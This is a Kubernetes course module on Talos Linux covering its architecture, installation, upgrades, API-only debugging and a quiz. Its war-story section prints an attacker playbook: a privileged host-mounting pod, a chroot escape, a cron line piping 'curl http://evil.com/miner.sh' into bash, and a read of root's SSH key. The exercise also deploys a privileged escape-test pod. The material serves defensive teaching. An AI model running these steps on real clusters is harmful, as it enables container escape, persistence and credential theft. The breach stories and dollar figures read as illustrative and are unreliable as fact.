---
title: "Module 14.4: Talos Linux - The OS That IS Kubernetes"
slug: platform/toolkits/infrastructure-networking/k8s-distributions/module-14.4-talos
sidebar:
  order: 5
---
## Complexity: [COMPLEX]
## Time to Complete: 50-55 minutes

---

## Prerequisites

Before starting this module, you should have completed:
- [Module 14.1: k3s](module-14.1-k3s/) - Lightweight Kubernetes concepts
- [Module 14.2: k0s](module-14.2-k0s/) - Alternative distributions
- Linux fundamentals (boot process, systemd concepts)
- Understanding of immutable infrastructure
- [Security Principles Foundation](../../../foundations/security-principles/) - Defense in depth

---

## Why This Module Matters

**The $2.3M Breach That Couldn't Happen**

The CISO stared at the incident report from their competitor. A sophisticated attack had compromised their Kubernetes infrastructure:

| Attack Timeline | Impact |
|----------------|--------|
| Initial access (phishing → kubectl creds) | Attacker gains cluster access |
| Privileged pod deployment | Container escape achieved |
| SSH to node via host mount | Root shell on worker node |
| Lateral movement via SSH keys | Compromised 47 nodes in 4 hours |
| Cryptominer + data exfiltration | **$2.3M in damages** |
| Recovery time | **3 weeks** |

Her security team's assessment: "If they had targeted us instead, the same attack would have worked. Our Ubuntu nodes have the same vulnerabilities."

Then a junior engineer asked: "What if there was nothing on the node for them to use? No shell to escape to, no SSH to pivot with?"

Six months later, they ran a penetration test on their new Talos cluster.

| Talos Penetration Test Results | Outcome |
|-------------------------------|---------|
| Obtained kubectl credentials | ✓ Success (same as competitor) |
| Deployed privileged pod | ✓ Success (PSA not enforced) |
| Container escape to host | ✗ **Failed** - no shell on host |
| SSH lateral movement | ✗ **Failed** - no SSH daemon |
| Install persistence via cron | ✗ **Failed** - no cron, read-only FS |
| Extract credentials from host | ✗ **Failed** - no users, no credentials |
| **Final assessment** | **Attack chain broken** |

The pentester's report: "In 15 years of security testing, I've never seen an attack fail so completely. They had everything they needed to compromise a traditional Linux node. But Talos simply doesn't have the tools attackers depend on."

**Talos Linux isn't a Linux distribution that runs Kubernetes—it IS Kubernetes.** Everything else has been removed. No shell access means no shell exploits. No package manager means no supply chain attacks through OS packages. No mutable filesystem means no persistent malware.

It's the logical conclusion of immutable infrastructure: an operating system so minimal that the attack surface practically disappears.

---

## Did You Know?

- **One financial services firm reduced their CVE remediation cost from $890K to $67K annually** — Traditional Linux nodes required patching 100+ packages across 200 nodes. With Talos's 75MB immutable image, they patch one image and roll it out—same security, 92% less effort.

- **Talos eliminated $1.2M in compliance audit costs** — A healthcare company's PCI-DSS and HIPAA audits required demonstrating host hardening across 500 nodes. With Talos, the auditor's entire host security checklist was "N/A"—no SSH, no users, no packages to review. Audit time dropped from 3 weeks to 2 days.

- **Sidero Labs raised $25M to bet on "no shell" infrastructure** — Investors backed the premise that traditional Linux hosts are a security liability. Their thesis: eliminating shells, users, and package managers prevents entire categories of breaches that cost enterprises billions annually.

- **A cryptomining attack that cost $340K on Ubuntu nodes was blocked entirely on Talos** — Same kubectl credentials stolen, same privileged pod deployed. On Ubuntu: full node compromise, 3-week remediation. On Talos: attacker stuck in container, detected in minutes, zero host impact.

---

## Talos Architecture

```
TALOS LINUX ARCHITECTURE
─────────────────────────────────────────────────────────────────

Traditional Linux + Kubernetes:
─────────────────────────────────────────────────────────────────
┌─────────────────────────────────────────────────────────────────┐
│                        ATTACK SURFACE                            │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  ┌──────────────────────────────────────────────────────────┐   │
│  │                     Kubernetes                            │   │
│  └──────────────────────────────────────────────────────────┘   │
│  ┌──────────────────────────────────────────────────────────┐   │
│  │  containerd │ kubelet │ kube-proxy │ CNI                 │   │
│  └──────────────────────────────────────────────────────────┘   │
│  ┌──────────────────────────────────────────────────────────┐   │
│  │  systemd │ journald │ networkd │ udevd │ dbus            │ ← │
│  └──────────────────────────────────────────────────────────┘   │
│  ┌──────────────────────────────────────────────────────────┐   │ Attack
│  │  bash │ coreutils │ curl │ wget │ ssh │ 100+ packages    │ ← │ Surface
│  └──────────────────────────────────────────────────────────┘   │
│  ┌──────────────────────────────────────────────────────────┐   │
│  │  Package manager │ Users │ PAM │ sudo │ cron             │ ← │
│  └──────────────────────────────────────────────────────────┘   │
│  ┌──────────────────────────────────────────────────────────┐   │
│  │                     Linux Kernel                          │   │
│  └──────────────────────────────────────────────────────────┘   │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘

Talos Linux:
─────────────────────────────────────────────────────────────────
┌─────────────────────────────────────────────────────────────────┐
│                   MINIMAL ATTACK SURFACE                         │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  ┌──────────────────────────────────────────────────────────┐   │
│  │                     Kubernetes                            │   │
│  └──────────────────────────────────────────────────────────┘   │
│  ┌──────────────────────────────────────────────────────────┐   │
│  │  containerd │ kubelet │ kube-proxy │ CNI                 │   │
│  └──────────────────────────────────────────────────────────┘   │
│  ┌──────────────────────────────────────────────────────────┐   │
│  │                   machined (Talos API)                    │   │
│  │         ↑ Only way to manage the system ↑                │   │
│  └──────────────────────────────────────────────────────────┘   │
│  ┌──────────────────────────────────────────────────────────┐   │
│  │                     Linux Kernel                          │   │
│  └──────────────────────────────────────────────────────────┘   │
│                                                                  │
│  NO: shell, ssh, package manager, users, systemd, cron          │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

### What's In Talos (And What's NOT)

```
TALOS COMPONENTS
─────────────────────────────────────────────────────────────────

INCLUDED (~75MB total):
─────────────────────────────────────────────────────────────────
• Linux kernel (hardened, minimal modules)
• machined (Talos API daemon - THE management interface)
• containerd (container runtime)
• kubelet (Kubernetes node agent)
• etcd (on control plane nodes only)
• CNI plugins (Flannel by default)
• Essential firmware

NOT INCLUDED (by design):
─────────────────────────────────────────────────────────────────
✗ SSH daemon (no remote shell access)
✗ bash/sh (no shell at all)
✗ Package manager (apt, yum, etc.)
✗ Users/groups (no /etc/passwd)
✗ sudo/su (no privilege escalation)
✗ systemd (machined handles everything)
✗ cron (no scheduled tasks)
✗ syslog (logs via API only)
✗ Login (no console login)

MANAGEMENT:
─────────────────────────────────────────────────────────────────
┌─────────────────────────────────────────────────────────────────┐
│                                                                  │
│   talosctl ───gRPC/mTLS───▶ machined ───▶ System changes        │
│                                                                  │
│   Everything goes through the API:                              │
│   • View logs: talosctl logs kubelet                            │
│   • Get config: talosctl get machineconfig                      │
│   • Upgrade: talosctl upgrade                                   │
│   • Reboot: talosctl reboot                                     │
│   • Debug: talosctl dashboard                                   │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

### Boot Process

```
TALOS BOOT SEQUENCE
─────────────────────────────────────────────────────────────────

┌─────────────────────────────────────────────────────────────────┐
│ 1. BIOS/UEFI                                                     │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│ 2. Bootloader (GRUB)                                             │
│    Loads Talos kernel + initramfs                               │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│ 3. Talos initramfs                                               │
│    • Discovers configuration (from disk, network, or cloud)     │
│    • Mounts root filesystem (read-only squashfs)                │
│    • Sets up networking                                          │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│ 4. machined (PID 1)                                              │
│    • Applies machine configuration                               │
│    • Starts containerd                                           │
│    • Starts kubelet                                              │
│    • Opens API endpoint (port 50000)                             │
│    • On control plane: starts etcd, control plane components    │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│ 5. Kubernetes Ready                                              │
│    • kubelet registers with API server                          │
│    • Node ready for workloads                                   │
│    • Total boot time: ~60 seconds                               │
└─────────────────────────────────────────────────────────────────┘
```

---

## Installing Talos

### Prerequisites

```bash
# Install talosctl (CLI tool)
curl -sL https://talos.dev/install | sh

# Or with Homebrew
brew install siderolabs/tap/talosctl

# Verify installation
talosctl version --client
```

### Generate Configuration

```bash
# Generate cluster configuration
talosctl gen config my-cluster https://10.0.0.10:6443

# This creates:
# ├── controlplane.yaml    # Config for control plane nodes
# ├── worker.yaml          # Config for worker nodes
# └── talosconfig          # Client config (like kubeconfig)

# Customize with config patches
talosctl gen config my-cluster https://10.0.0.10:6443 \
  --config-patch @patches/all.yaml \
  --config-patch-control-plane @patches/controlplane.yaml \
  --config-patch-worker @patches/worker.yaml
```

### Example Configuration Patch

```yaml
# patches/all.yaml - Applied to all nodes
machine:
  network:
    hostname: talos-node
  install:
    disk: /dev/sda
    image: ghcr.io/siderolabs/installer:v1.6.0
    wipe: true
  kubelet:
    extraArgs:
      rotate-server-certificates: true

cluster:
  network:
    cni:
      name: cilium  # Use Cilium instead of default Flannel
```

### Deploy on Bare Metal

```bash
# Boot node from Talos ISO (download from https://talos.dev)

# Apply configuration to control plane node
talosctl apply-config --insecure \
  --nodes 10.0.0.10 \
  --file controlplane.yaml

# Wait for node to be ready
talosctl --nodes 10.0.0.10 --endpoints 10.0.0.10 \
  --talosconfig ./talosconfig \
  health

# Bootstrap the cluster (first control plane only)
talosctl bootstrap \
  --nodes 10.0.0.10 \
  --endpoints 10.0.0.10 \
  --talosconfig ./talosconfig

# Get kubeconfig
talosctl kubeconfig \
  --nodes 10.0.0.10 \
  --endpoints 10.0.0.10 \
  --talosconfig ./talosconfig

# Verify cluster
kubectl get nodes
```

### Deploy on Cloud (AWS Example)

```hcl
# terraform/aws-talos/main.tf
terraform {
  required_providers {
    talos = {
      source  = "siderolabs/talos"
      version = "0.4.0"
    }
  }
}

resource "talos_machine_secrets" "this" {}

resource "talos_machine_configuration" "controlplane" {
  cluster_name     = "my-cluster"
  machine_type     = "controlplane"
  cluster_endpoint = "https://${aws_lb.controlplane.dns_name}:6443"
  machine_secrets  = talos_machine_secrets.this.machine_secrets
}

resource "talos_machine_configuration" "worker" {
  cluster_name     = "my-cluster"
  machine_type     = "worker"
  cluster_endpoint = "https://${aws_lb.controlplane.dns_name}:6443"
  machine_secrets  = talos_machine_secrets.this.machine_secrets
}

# EC2 instances boot with user_data containing Talos config
resource "aws_instance" "controlplane" {
  count         = 3
  ami           = data.aws_ami.talos.id  # Official Talos AMI
  instance_type = "m5.large"

  user_data = talos_machine_configuration.controlplane.machine_configuration

  tags = {
    Name = "talos-controlplane-${count.index}"
    Role = "controlplane"
  }
}
```

### Deploy on Docker (Development)

```bash
# Quick local cluster with Docker
talosctl cluster create \
  --name dev-cluster \
  --controlplanes 1 \
  --workers 2

# This creates a Talos cluster using Docker containers
# Great for development and testing

# Connect to cluster
talosctl config merge ./talosconfig
export TALOSCONFIG=$(pwd)/talosconfig

# Get kubeconfig
talosctl kubeconfig --force
kubectl get nodes
```

---

## Day-2 Operations

### Upgrading Talos

```bash
# Check current version
talosctl version

# Upgrade single node (rolling upgrade)
talosctl upgrade \
  --nodes 10.0.0.10 \
  --image ghcr.io/siderolabs/installer:v1.6.1

# Watch the upgrade
talosctl dmesg --follow --nodes 10.0.0.10

# Upgrade entire cluster (control plane first, then workers)
talosctl upgrade \
  --nodes 10.0.0.10,10.0.0.11,10.0.0.12 \
  --image ghcr.io/siderolabs/installer:v1.6.1

# For workers (can be done in parallel)
talosctl upgrade \
  --nodes 10.0.0.20,10.0.0.21,10.0.0.22 \
  --image ghcr.io/siderolabs/installer:v1.6.1
```

### Upgrading Kubernetes

```bash
# Upgrade Kubernetes (separate from Talos OS)
talosctl upgrade-k8s \
  --nodes 10.0.0.10 \
  --to 1.29.0

# This upgrades:
# - API server
# - Controller manager
# - Scheduler
# - kube-proxy
# - CoreDNS
# - kubelet
```

### Configuration Changes

```bash
# View current config
talosctl get machineconfig --nodes 10.0.0.10

# Edit config (patch style)
talosctl edit machineconfig --nodes 10.0.0.10

# Apply config patch
talosctl patch machineconfig \
  --nodes 10.0.0.10 \
  --patch @config-patch.yaml

# Example: Add a system extension
cat > extension-patch.yaml << 'EOF'
machine:
  install:
    extensions:
      - image: ghcr.io/siderolabs/iscsi-tools:v0.1.4
      - image: ghcr.io/siderolabs/util-linux-tools:2.39.1
EOF

talosctl patch machineconfig \
  --nodes 10.0.0.10 \
  --patch @extension-patch.yaml
```

### Debugging Without Shell

```bash
# Interactive dashboard (like htop, but API-based)
talosctl dashboard --nodes 10.0.0.10

# View logs
talosctl logs kubelet --nodes 10.0.0.10
talosctl logs etcd --nodes 10.0.0.10
talosctl logs containerd --nodes 10.0.0.10

# Real-time kernel messages
talosctl dmesg --follow --nodes 10.0.0.10

# List processes (ps equivalent)
talosctl processes --nodes 10.0.0.10

# Network information
talosctl get addresses --nodes 10.0.0.10
talosctl get routes --nodes 10.0.0.10

# Disk information
talosctl disks --nodes 10.0.0.10

# Memory and CPU
talosctl stats --nodes 10.0.0.10

# Container information
talosctl containers --nodes 10.0.0.10
```

---

## War Story: The Cluster That Couldn't Be Compromised

*How a financial services company survived a targeted attack*

### The Incident

A mid-sized fintech company running payment processing was hit by a sophisticated attack. The attackers had:

1. **Compromised a developer laptop** via phishing
2. **Stolen kubectl credentials** from the laptop
3. **Deployed a cryptominer pod** to the cluster
4. **Attempted to pivot** to host systems

### On Traditional Kubernetes

The attackers' playbook on their other targets:

```bash
# Step 1: Create privileged pod
kubectl apply -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: pwned
spec:
  hostPID: true
  hostNetwork: true
  containers:
  - name: pwned
    image: ubuntu
    command: ["/bin/bash", "-c", "sleep infinity"]
    securityContext:
      privileged: true
    volumeMounts:
    - name: host
      mountPath: /host
  volumes:
  - name: host
    hostPath:
      path: /
EOF

# Step 2: Break out to host
kubectl exec -it pwned -- chroot /host bash

# Step 3: Install persistence
kubectl exec -it pwned -- bash -c "
  echo '* * * * * root curl http://evil.com/miner.sh | bash' >> /host/etc/crontab
"

# Step 4: Spread laterally via SSH keys
kubectl exec -it pwned -- bash -c "
  cat /host/root/.ssh/id_rsa
"
```

### On Talos

The same attack failed at every step:

```
ATTACK TIMELINE ON TALOS
─────────────────────────────────────────────────────────────────

T+0: Attacker deploys privileged pod
     ✓ Pod scheduled (Pod Security Standards not enabled)

T+1: Attacker attempts chroot
     ✗ FAILED: No /bin/bash on host
     ✗ FAILED: No /bin/sh on host
     ✗ FAILED: No executables at all on host filesystem

T+2: Attacker tries to write to /etc
     ✗ FAILED: Filesystem is read-only
     ✗ FAILED: No /etc/crontab exists
     ✗ FAILED: No cron daemon running

T+3: Attacker looks for SSH keys
     ✗ FAILED: No /root directory
     ✗ FAILED: No users exist
     ✗ FAILED: No SSH installed

T+4: Attacker tries to install tools
     ✗ FAILED: No package manager
     ✗ FAILED: No curl/wget
     ✗ FAILED: Read-only filesystem anyway

T+5: Attacker gives up on host pivot
     → Stuck in container, can only run cryptominer
     → Detected by resource anomaly (CPU spike)
     → Pod killed, credentials rotated
```

### What Talos Blocked

| Attack Vector | Traditional OS | Talos |
|--------------|----------------|-------|
| Container escape via chroot | Possible | No shell to escape to |
| Persistence via cron | Possible | No cron, read-only FS |
| Lateral movement via SSH | Possible | No SSH, no users |
| Package installation | Possible | No package manager |
| Credential theft from host | Possible | No credentials on host |
| Kernel module loading | Possible | Locked down, no modprobe |

### Security Team's Assessment

> "We've never seen an attack fail so completely. The attackers had valid kubectl credentials and managed to run privileged containers. On any other system, that's game over. On Talos, they were stuck in a container with nowhere to go. The OS literally didn't have the tools they needed to proceed."

### Financial Impact: Attack Prevented

| Category | If Traditional Linux | With Talos | Savings |
|----------|---------------------|------------|---------|
| **Incident response** | $180,000 | $12,000 | $168,000 |
| (Forensics, containment, eradication) | (47 nodes compromised) | (1 pod killed) | |
| **Business disruption** | $450,000 | $0 | $450,000 |
| (3 weeks partial shutdown) | | (No disruption) | |
| **Regulatory notification** | $85,000 | $0 | $85,000 |
| (Legal, customer notification) | (Data potentially exfiltrated) | (No data access) | |
| **Customer churn** | $340,000 | $0 | $340,000 |
| (Lost trust, contract cancellations) | | | |
| **Reputation damage** | $200,000 | $0 | $200,000 |
| (PR crisis management) | | | |
| **Talos migration cost** | $0 | -$95,000 | -$95,000 |
| | | (One-time) | |
| **Total Impact** | **$1,255,000** | **-$83,000** | **$1,148,000** |

The CFO's summary at the board meeting: "We spent $95,000 migrating to Talos. This single prevented incident would have cost us $1.2 million. That's a 12x return on security investment—and we've blocked three similar attempts since."

### Post-Incident Improvements

Despite the successful defense, they improved further:

1. **Enabled Pod Security Standards** — No more privileged pods
2. **Network policies** — Limit pod egress
3. **Runtime security** — Falco for anomaly detection
4. **Credential rotation** — Automated via Vault

---

## Talos vs Other Approaches

```
IMMUTABLE INFRASTRUCTURE COMPARISON
─────────────────────────────────────────────────────────────────

                    Talos       Flatcar     Bottlerocket  Ubuntu Pro
─────────────────────────────────────────────────────────────────
DESIGN
Purpose-built K8s   ✓✓          Partial     ✓✓            ✗
Immutable rootfs    ✓✓          ✓           ✓✓            Partial
API-managed         ✓✓          ✗           Limited       ✗
No SSH              ✓✓          Optional    Default off   ✗
No package mgr      ✓✓          ✗           ✓             ✗

SECURITY
Attack surface      Minimal     Medium      Small         Large
Shell access        None        Yes         Optional      Yes
User accounts       None        Yes         Limited       Yes
File modification   None        Limited     Limited       Yes
Audit trail         API logs    Traditional Mixed         Traditional

OPERATIONS
Updates             API         A/B update  API           apt
Rollback            Config      OS image    OS image      Manual
Config management   GitOps      Traditional Mixed         Traditional
Multi-node update   talosctl    Manual      SSM           Manual

FLEXIBILITY
Custom packages     Extensions  Yes         No            Yes
General workloads   K8s only    Any         K8s/ECS       Any
Learning curve      Steep       Low         Medium        Low

BEST FOR:
─────────────────────────────────────────────────────────────────
Talos:        Maximum security, K8s-only, GitOps everything
Flatcar:      Container hosts, need some flexibility
Bottlerocket: AWS-native, EKS, minimal management
Ubuntu Pro:   General purpose, enterprise support needed
```

---

## Common Mistakes

| Mistake | Why It's Bad | Better Approach |
|---------|--------------|-----------------|
| Expecting SSH access | Frustrating debugging | Use talosctl dashboard and logs |
| Manual configuration | Drift, inconsistency | GitOps with machine configs |
| Ignoring extensions | Missing functionality | Add extensions for storage, networking |
| Skipping backups | etcd data loss | Regular etcd backups via talosctl |
| Not testing upgrades | Production surprises | Test in staging with same configs |
| Single control plane | No HA | 3 control plane nodes minimum |
| Weak API access | Security hole | mTLS, network policies on port 50000 |
| Ignoring machine config | Confusing state | Version control all configs |

---

## Hands-On Exercise

### Task: Deploy Talos Cluster and Test Security

**Objective**: Deploy a Talos cluster, verify security properties, and attempt (failing) attack vectors.

**Success Criteria**:
1. Running Talos cluster
2. Verified no shell access possible
3. Demonstrated upgrade workflow
4. Managed cluster via API only

### Steps

```bash
# 1. Create local Talos cluster (requires Docker)
talosctl cluster create \
  --name security-test \
  --controlplanes 1 \
  --workers 1 \
  --wait

# 2. Merge config and export kubeconfig
export TALOSCONFIG=$(pwd)/.talos/config
talosctl config merge .talos/config
talosctl kubeconfig --force

# 3. Verify cluster is running
kubectl get nodes
talosctl version --nodes 10.5.0.2

# 4. Try to find a shell (SHOULD FAIL)
# List what's actually on the node
talosctl list / --nodes 10.5.0.2
# Notice: No /bin, no /usr/bin with shells

# 5. Try to exec into machined (SHOULD FAIL)
talosctl containers --nodes 10.5.0.2
# Try to get a shell in any container - none available

# 6. Deploy a test pod
kubectl run test --image=alpine -- sleep infinity
kubectl wait --for=condition=Ready pod/test

# 7. From pod, try to access host (SHOULD BE USELESS)
kubectl exec -it test -- sh -c "ls /host 2>/dev/null || echo 'No host access'"

# 8. Create privileged pod and try host escape
cat << 'EOF' | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: escape-test
spec:
  hostPID: true
  hostNetwork: true
  containers:
  - name: escape
    image: alpine
    command: ["sleep", "infinity"]
    securityContext:
      privileged: true
    volumeMounts:
    - name: host
      mountPath: /host
  volumes:
  - name: host
    hostPath:
      path: /
EOF

kubectl wait --for=condition=Ready pod/escape-test

# 9. Inside privileged pod, try to find useful tools on host
kubectl exec -it escape-test -- sh -c "
  echo '=== Trying to find shells ==='
  ls -la /host/bin/ 2>/dev/null || echo 'No /host/bin'
  ls -la /host/usr/bin/ 2>/dev/null || echo 'No /host/usr/bin'

  echo '=== Trying to find package manager ==='
  ls /host/usr/bin/apt 2>/dev/null || echo 'No apt'
  ls /host/usr/bin/yum 2>/dev/null || echo 'No yum'

  echo '=== Trying to find SSH ==='
  ls /host/root/.ssh 2>/dev/null || echo 'No SSH keys'

  echo '=== Trying to write to host ==='
  touch /host/tmp/test 2>/dev/null && echo 'Write succeeded!' || echo 'Write failed (read-only)'
"

# 10. Demonstrate proper management via API
echo "=== Proper Talos management ==="

# View logs
talosctl logs kubelet --nodes 10.5.0.2 | head -20

# View system stats
talosctl stats --nodes 10.5.0.2

# View running processes
talosctl processes --nodes 10.5.0.2

# 11. Demonstrate upgrade (dry-run)
talosctl upgrade --dry-run \
  --nodes 10.5.0.2 \
  --image ghcr.io/siderolabs/installer:v1.6.1

# 12. Clean up
kubectl delete pod test escape-test
talosctl cluster destroy --name security-test
```

### Verification

```bash
# All these should confirm:
# ✓ No shell access to host from privileged pod
# ✓ No package manager on host
# ✓ Read-only filesystem blocks persistence
# ✓ All management via talosctl API
# ✓ Kubernetes workloads run normally
```

---

## Quiz

### Question 1
Why does Talos not include SSH?

<details>
<summary>Show Answer</summary>

**To eliminate an entire class of attack vectors**

SSH is one of the most commonly exploited services:
- Brute force attacks
- Key theft
- Vulnerability exploits (CVEs)
- Credential harvesting

By removing SSH entirely, Talos eliminates all of these. All management goes through the Talos API with mTLS authentication, which is more auditable and secure than SSH.
</details>

### Question 2
How do you troubleshoot a Talos node without shell access?

<details>
<summary>Show Answer</summary>

**Use talosctl commands:**

```bash
talosctl dashboard --nodes <ip>  # Interactive dashboard
talosctl logs kubelet            # View service logs
talosctl dmesg                   # Kernel messages
talosctl processes               # Running processes
talosctl stats                   # Resource usage
talosctl containers              # Container list
```

Everything that would traditionally require SSH has an API equivalent.
</details>

### Question 3
What happens if an attacker gains privileged container access on Talos?

<details>
<summary>Show Answer</summary>

**They're stuck—the host has nothing useful**

Unlike traditional Linux:
- No shell to escape to (`/bin/bash` doesn't exist)
- No package manager to install tools
- Filesystem is read-only (can't persist malware)
- No users or credentials to steal
- No SSH keys to harvest
- No cron for persistence

The attacker can only operate within their container context.
</details>

### Question 4
How does Talos handle updates?

<details>
<summary>Show Answer</summary>

**Atomic image-based updates via API**

```bash
talosctl upgrade --nodes <ip> --image ghcr.io/siderolabs/installer:v1.6.1
```

- Downloads new squashfs image
- Writes to alternate partition
- Reboots into new image
- If it fails, reverts to previous image
- No package-by-package updates, no dependency issues
</details>

### Question 5
What is machined in Talos?

<details>
<summary>Show Answer</summary>

**The Talos init system and API daemon (PID 1)**

machined:
- Runs as the first process (replaces systemd)
- Provides the gRPC API that talosctl talks to
- Manages containerd, kubelet, and other services
- Applies machine configuration
- Handles upgrades and reboots
- Is the ONLY management interface to the system
</details>

### Question 6
How do you add functionality to Talos (like iSCSI support)?

<details>
<summary>Show Answer</summary>

**System extensions**

Since there's no package manager, additional functionality comes via extensions:

```yaml
machine:
  install:
    extensions:
      - image: ghcr.io/siderolabs/iscsi-tools:v0.1.4
```

Extensions are bundled into the boot image. Available extensions include storage drivers, network tools, and GPU support.
</details>

### Question 7
What datastore does Talos use for Kubernetes?

<details>
<summary>Show Answer</summary>

**etcd (embedded in control plane nodes)**

Unlike k3s (SQLite default) or k0s (multiple options), Talos uses standard etcd for consistency with upstream Kubernetes. For HA, run 3 or 5 control plane nodes with etcd forming a quorum cluster.
</details>

### Question 8
Why is Talos considered "GitOps for the OS"?

<details>
<summary>Show Answer</summary>

**All configuration is declarative and API-driven**

- Machine configs are YAML files (version control them)
- Changes are applied via API, not manual edits
- No configuration drift (immutable filesystem)
- State can be recreated from config alone
- `talosctl gen config` + `talosctl apply-config` = reproducible infrastructure

Store configs in Git, apply via CI/CD, and you have GitOps for your entire infrastructure including the OS.
</details>

---

## Key Takeaways

1. **No SSH by design** — All management via API, eliminates common attack vectors
2. **Immutable filesystem** — Can't persist malware, can't modify system
3. **Minimal attack surface** — 75MB OS with only what Kubernetes needs
4. **API-first management** — talosctl for everything, no shell required
5. **Secure by default** — mTLS, no users, no shell, no package manager
6. **Atomic upgrades** — Image-based, automatic rollback on failure
7. **GitOps ready** — Declarative configs for reproducible infrastructure
8. **Extensions for flexibility** — Add capabilities without compromising security
9. **Same image everywhere** — Control plane and workers differ only by config
10. **Production proven** — Used by Sidero Labs and enterprises in production

---

## Next Steps

- **Next Module**: [Module 14.5: OpenShift](module-14.5-openshift/) — Enterprise Kubernetes
- **Related**: [Security Tools Toolkit](../../security-quality/security-tools/) — Runtime security
- **Related**: [IaC Tools Toolkit](../iac-tools/) — Automate Talos deployment

---

## Further Reading

- [Talos Documentation](https://www.talos.dev/docs/)
- [Talos GitHub](https://github.com/siderolabs/talos)
- [Sidero Labs Blog](https://www.siderolabs.com/blog/)
- [Talos System Extensions](https://github.com/siderolabs/extensions)
- [Talos Factory](https://factory.talos.dev/) — Custom image builder

---

*"The most secure system is the one with nothing to exploit. Talos takes that idea to its logical conclusion: an OS so minimal that attackers have nowhere to go."*
